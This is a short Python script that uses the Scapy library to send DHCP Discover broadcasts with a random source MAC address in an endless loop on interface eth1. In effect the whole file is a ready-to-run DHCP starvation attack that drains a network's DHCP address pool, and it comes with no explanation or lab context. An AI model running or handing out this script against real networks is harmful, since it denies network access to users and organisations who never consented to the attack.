from scapy.all import *

discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(dport=67,sport=68) / BOOTP(op=1) / DHCP(options=[('message-type','discover'),('end')])
sendp(discover, iface = 'eth1',loop=1)
